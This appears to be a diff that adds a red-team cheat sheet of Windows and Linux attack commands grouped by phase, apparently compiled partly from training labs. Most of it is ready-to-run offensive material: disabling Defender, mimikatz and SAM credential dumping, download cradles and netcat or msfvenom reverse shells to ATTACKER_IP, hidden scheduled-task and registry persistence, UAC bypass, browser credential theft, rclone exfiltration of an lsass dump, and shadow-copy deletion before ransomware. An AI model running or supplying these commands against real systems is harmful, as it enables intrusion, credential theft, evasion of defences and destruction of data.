@@ -1,0 +1,948 @@
+reg add hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" /d "kerberos/0msv1_0/0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
+
+reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages" /d "kerberos\0msv1_0\schannel\wdigest\0tspkg\0pku2u\0minilb" /t REG_MULTI_SZ /f
+
+
+reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
+
+
+==================
+WDigest
+
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f
+
+================================
+Check if RunAsPPL running
+
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /f
+==================================================
+privilege::debug
+sekurlsa::minidump c:\users\Administrator\Desktop\lsas.DM
+sekurlsa::logonpasswords
+
+=========================================
+
+interesting go by: https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 
+
+latest mimikatz update: https://github.com/gentilkiwi/mimikatz/releases 
+
+got it from: https://twitter.com/gentilkiwi/status/851193274836692994 
+
+about rdp and bmp https://www.allthingsdfir.com/do-you-even-bitmap-cache-bro/ 
+
+=========================================
+Initial access
+process injection
+
+shodan public facing app
+phishing link browserling virustotal
+process injection & tcpview for blue team detection
+Easy-P
+cobalt Strike Macro venom etc
+=========================================
+Defence Evasion Phase
+net stop "WinDefend"
+sc config "WinDefend" start=disabled
+
+if you don't have privilege to disable services means you can't also modify things under services here: reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "
+
+so then play with regestaries
+
+Add Commands:
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+
+Query Commands:
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable"
+
+Delete Commands:
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f
+
+or just run https://gist.github.com/pe3zx/7c5e0080c3b0869ccba1f1dc2ea0c5e0
+
+WinDef Exclusion Direcotry:
+WMIC /NAMESPACE:\\root\Microsoft\Windows\Defender PATH MSFT_MpPreference call Add_ExclusionPath="C:\PerfLogs\"
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+
+powershell.exe Add-MpPreference -ExclusionPath C:\Windows;
+
+C:\Windows\Temp
+C:\Users\User
+C:\PerfLogs
+
+download tdsskiller to one of the exlcuded directories and execute
+[T1105]
+certutil.exe -urlcache -f http://192.168.18.235/tdsskiller.exe tdsskiller.exe
+certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+[T1027]
+certutil -encode payload.exe Encoded-payload.txt
+
+[T1197]
+bitsadmin /transfer rootkittool /download /priority normal http://192.168.18.235/rootkitremover.exe C:\PerfLogs\RootkitRemover.exe
+bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+sc query
+sc query WinDefend
+
+DS0009 process termination
+
+
+tdsskiller -dcsvc WinDefend
+tdsskiller -dcsvc Bitdefender
+
+
+=========================================
+Post Exploitation
+
+T1070 006
+Time Stomping Attack
+
+timestomper.exe to avoid Antiviruses and investigators
+------------------
+Cobalt Strike
+-------------------------
+
+=========================================
+Persistence phase
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v rootkit /t REG_SZ /d "C:\PerfLogs\RootkitRemover"
+copy "C:\PerfLogs\RootkitRemover.exe" "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+------------------ [ Abusing Scheduled Tasks ] ------------------
+schtasks /create /ru SYSTEM /sc ONSTART /tn rootkit /tr "cmd /c C:\path"
+SCHTASKS /create /ru "SYSTEM" /sc MINUTE /mo 1 /tn rootkit1 /F /tr 
+schtasks /create /tn rootkit4 /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -windowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://192.168.18.235/rootkit.ps1'))'" /sc onlogon /ru System
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+schtasks /query /tn thm-taskbackdoor
+schtasks /query /tn vulntask /fo list /v
+
+------------------ [ Making Our Task Invisible] ------------------
+Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
+
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"  // see all schtasks
+c:\tools\pstools\PsExec64.exe -s -i regedit
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree  // delete SD from tn
+schtasks /query /tn thm-taskbackdoor
+
+------------------ [ Logon Triggered Persistence ] ------------------
+------------------ [ Run / RunOnce ] ------------------
+Instead of delivering your payload into a specific directory 
+C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+we can 
+
+    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "com.squirrel.Teams.Teams" /f
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyCustomStartup" /t REG_EXPAND_SZ /d "%SystemDrive%\Users\Administrator\Desktop\rev.exe"
+
+------------------ [ Winlogon ] ------------------
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d " C:\Windows\system32\userinit.exe,C:\Users\Administrator\Desktop\rev.exe" /f
+
+------------------ [ Winlogon ] ------------------
+reg query "HKCU\Environment" 
+reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_EXPAND_SZ /d "C:\Users\Administrator\revshell.exe" /f
+
+------------------
+T1098
+net user 
+net localgroup administrators thmuser0 /add       ///If this looks too suspicious
+
+net localgroup "Backup Operators" thmuser1 /add 
+
+///Users in "Backup Operators" group won't have administrative privileges but will be allowed to read/write (SeBackupPrivilege/SeRestorePrivilege) any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups.
+
+net localgroup "Remote Management Users" thmuser1 /add
+
+ // when we RDP notice even if you are on the Backups Operators group, you wouldn't be able to access all files as expected.  we are a part of Backup Operators, but the group is disabled This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC here), if you are using WinRM, you are confined to a limited access token with no administrative privileges. To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /// View all enabled disabled UAC policies in the system
+----[Special Privileges and Security Descriptors SeBackup / SeRestore]-------
+or we assign a user a specific token( security descriptor) instead of joining the whole group and get the tokens by default:
+secedit /export /cfg config.inf
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI this is for and for the RDP/WinRM 
+
+Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy
+----
+then we can always do Pass-The-Hash:
+evil-winrm -i 10.10.255.179 -u Administrator -H [HASH]
+copy cmd.exe utilman.exe
+
+--------------------[SeTakeOwnership] -----------
+if you have it 
+
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.
+
+
+ whoami /priv
+
+$filePath = "C:\Windows\System32\Utilman.exe"
+$acl = Get-Acl $filePath
+$owner = $acl.Owner
+$acl.Access | Where-Object { $_.IdentityReference.Value -eq $owner }
+
+
+takeown /f C:\Windows\System32\Utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+
+$filePath = "C:\Windows\System32\Utilman.exe"
+$acl = Get-Acl $filePath
+$owner = $acl.Owner
+$acl.Access | Where-Object { $_.IdentityReference.Value -eq $owner }
+
+--------------------[SeImpersonate] -----------
+if you have it 
+
+These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
+
+whoami /priv
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+nc -lvp 4442
+--------------------[RID Hijacking]---------------
+When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
+
+wmic useraccount get name,sid
+PsExec64.exe -i -s regedit
+HKLM\SAM\SAM\Domains\Account\Users\
+
+------[ Backdooring Files ]---------
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+or write
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+
+C:\Windows\System32\calc.exe
+to file.ps1 and put in the exec short cut 
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+
+------[ Hijacking File Associations ]---------
+reg query "HKLM\Software\Classes\.txt"   // for Programmatic ID (ProgID) 
+reg query "HKLM\Software\Classes\txtfile\shell\open\command"
+write to file: 
+
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+reg add "HKLM\Software\Classes\txtfile\shell\open\command" /d "powershell.exe -WindowStyle hidden C:\Windows\System32\power2.ps1" /f
+
+=========================================
+Privilege Escalation
+
+med 2 hi
+
+elevationstation         // UAC Bypass and Elevate from Medium to High Integrity.
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f   //to mae cmd always admin Utilizing the LUA Registry Key for UAC Deactivation.
+
+cable strike: elevate uac-token-duplication smbrev      /// UAC token Duplication Attack
+
+hi 2 sys
+
+elevationstation -np ///  Named Pipe Impersonation Attack blue teamers check for 7045 events installed exe & 7034 service termination
+
+elevate svc-exe smbrev/reverse     // Elevate Privilege through Service Control Manager
+
+elevate cve-2020-0796 reverse     /// if windows verion 10.0.2200
+---------------------------------------------
+Create Service vulnerable to unqoute | Vuln Service with unquoted service path: 
+
+
+Without Quotes
+sc create "unquoted" binpath= "C:\Program Files\Vul path\Unquoted path\vul.exe" Displayname= "unquoted services" start= auto
+
+With Quotes
+sc create safeservice binpath= "\"C:\Program Files (x86)\Safe Service\Safe Service2\"" displayname= "My Service"
+
+wmic service get PathName,DisplayName
+
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+---------------------------------------------
+findstr /si password *.txt
+
+powershell -command "Get-Clipboard"
+
+Registry
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+REG QUERY HKLM /F "password" /t REG_SZ /S /d
+REG QUERY HKCU /F "password" /t REG_SZ /S /d
+
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+
+---------------------------------
+Insecure Permissions on Service Executable: (the goal is to write into a service that run by another user to gain access)
+sc qc WindowsScheduler
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe; python3 -m http.server
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+nc -lvp 4445
+sc stop windowsscheduler
+sc start windowsscheduler
+(or run my powershell for autmation of finding all services with (M) persmission for everyone in tsksch to write on service but if you can't find to write on service then check unqoutes ;))
+
+=========================================
+Credential Access
+
+IIS Configuration
+
+
+    C:\inetpub\wwwroot\web.config
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+---------------------------
+The credintial dumping book
+------------
+dump lsa then 
+
+pypykatz lsa minidump lsass1.DMP
+
+-----------
+browser data:
+
+sekurlsa::dpapi
+
+dpapi::chrome /in:"C:\users\user\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:93066b192c77cf3bde8ae511dcccfc278fc52ae2754aaccfe938967542aa38f30b76382f802e9fdf0abd937141422acf5924be0c74f126ec29dbe099fa9427a
+----------------------
+registery LOLBAS:
+
+reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+crack using tools like secreddump.py: https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
+python3 secretsdump.py -sam sam.save -system system.save LOCAL
+------------------------------------
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+-------------------
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+--------------------
+
+    C:\Unattend.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\Panther\Unattend\Unattend.xml
+    C:\Windows\system32\sysprep.inf
+    C:\Windows\system32\sysprep\sysprep.xml
+-------------------------------------
+
+=========================================
+Lateral Movement
+
+enable RDP in the target machine (need admin):
+
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall show rule name=all dir=in | Select-String -Pattern "3389" -Context 9,9
+netsh advfirewall firewall show rule name=all | find "3389"
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
+
+-------------------------------
+
+python3 psexec.py WinDev2211Eval/user:password@192.168.18.252 // if you give it Admin domain RDP account you'll directly be getting system mendatory level & you can check events for 7045 last time to enter the password i had to do qoutes
+wevtutil qe System /q:"*[System[(EventID=7045)]]" /f:text // you will find created service Pblpclun.exe
+mitigations: https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/     
+block smb inbound connection to prevent psexec:  netsh advfirewall firewall add rule name="Block_SMB_Inbound" dir=in action=block protocol=TCP localport=137,138,139,445
+
+impacket tools: https://tools.thehacker.recipes/impacket
+
+=========================================
+Exfiltration - public data online
+
+rclone config  //after configuring your login
+rclone listremotes
+rclone lsf mega:
+"C:\Windows\system32\rclone.exe" copy C:\temp\lsass.DMP mega:exfil -P -u --checkers 100 --ignore-existing --checkers 50 --auto-confirm --max-age 5y --multi-thread-cutoff 50M --stats 10s --stats-one-line --transfers 150 --multi-thread-streams 500  // the extra flags to bypass the company to block certain number of packets size etc
+
+=========================================
+Impact
+
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete // attackers executing before executing ransomeware to not be able to return data
+=========================================
+
+grep with security trail API so all the subdomain in one file
+throw the file in websee so it gives you all the ip of the working hosts
+put the file in jok3r to filter out the running domains and detect running technolo
+
+
+
+=================  [ inv2root ] ==================
+wmic product get name,version,vendor
+
+=================  [ TO BE SORTED ] ==================
+
+
+-----------[Linux Pivoting ] -----------
+
+
+LOL port scanner:
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done 
+
+blocks ping but suspicted to be live:
+for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+
+Windows poweshell portscanning is slow alternatively statically compiled program written in (C/C++/Rust/etc):
+C# - https://github.com/MuirlandOracle/C-Sharp-Port-Scan
+C++ - https://github.com/MuirlandOracle/CPP-Port-Scanner
+
+static binaries:
+https://github.com/andrew-d/static-binaries
+
+static binary nmap :
+https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip
+
+connect to their living room (run on the attacker) :
+
+
+Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:
+
+ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+
+send to their living room (run on the attacker) :
+
+
+Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:
+
+ssh -D 1337 user@172.16.0.5 -fN
+
+This again uses the -fN switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.
+
+
+-------------------------
+
+Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:
+
+
+after the attacker steps:
+ssh-keygen
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ${.pub}
+sudo systemctl status ssh
+sudo systemctl start ssh
+
+Transfer private key to the target then 
+
+To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
+
+
+ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN  ( on target machine)
+
+This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!
+
+
+In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
+
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN ( on target machine)
+
+This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.
+
+Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.
+
+---------
+Question 
+
+
+If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
+
+ssh -R 22:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
+
+What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
+
+ssh -D 8000 user@target.thm -fN
+--------------------------------------
+plink.exe 
+
+ to create a reverse connection. This would be done with the following command:
+cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+
+The cmd.exe /c echo y at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.
+
+
+To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:
+cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
+
+Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using sudo apt install putty-tools. After downloading the tool, conversion can be done with:
+puttygen KEYFILE -o OUTPUT_KEY.ppk
+Substituting in a valid file for the keyfile, and adding in the output file.
+
+The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).
+
+Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from:
+https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  before a new engagement is sensible.
+----------------------------------------
+Socat
+
+https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download
+
+~~~~~~~~~~`` Reverse Shell Relay ~~~~~~~~~~~~~
+
+sudo nc -lvnp 443
+./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
+./nc-MuirlandOracle 127.0.0.1 8000 -e /bin/bash
+
+
+ ~~~~~~~~~~~~  Port Forwarding -- Easy ~~~~~~~~~
+
+Port Forwarding -- Easy
+
+The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
+./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+
+This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.
+
+We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.
+
+-------------------------------------------------------
+
+
+~~~~~~~~~ Port Forwarding -- Quiet ~~~~~~~~~
+
+The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
+
+First of all, on our own attacking machine, we issue the following command:
+socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+
+This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.
+
+Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
+./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+
+This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
+./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
+
+This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!
+
+This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:
+
+    The request goes to 127.0.0.1:8000
+    Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
+    Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
+
+The process is then reversed when the target sends the response:
+
+    The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
+    Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.
+
+We have now achieved the same thing as previously, but without opening any ports on the server!
+
+
+
+~~~~~~~~~ FINALLY   ~~~~~~~~~
+pkill socat
+-----------------------------------------------------------------------------------------
+~~~~~~~~~ Chisel ~~~~~~~~~
+
+
+
+
+--------------------------------------------------------------------------------------
+
+
+DETECT FIREWALLS IN PLACE 
+
+Get-Service WinDefend
+
+Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled
+
+Get-NetFirewallProfile | Format-Table Name, Enabled
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+Get-NetFirewallProfile | Format-Table Name, Enabled
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+test inbound connection without extra tools, then we can do the following: 
+Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+
+Get-EventLog -List
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+
+All these commands confirm if the sysmon tool is installed. Once we detect it, we can try to find the sysmon configuration file if we have readable permission to understand what system administrators are monitoring.
+
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+wmic product get name,version
+Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
+
+redteamers tools:
+https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
+---------------------------
+Enumeration starting with systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+---------------
+
+AlwaysInstallElevated
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+---------------------------------------------------------
+PowerLessShell evade whitelisting
+
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+
+-----------------------------------------
+
+T1547, where an attacker creates or modifies a shortcut in order to take advantage of this technique.
+https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md
+-------------------------------------
+Windows Subsystem for Linux WSL T1202 
+bash.exe -c "path-to-payload"
+----------------------------------------
+Signed Binary Proxy Execution (T1218)
+wmic.exe process call create calc
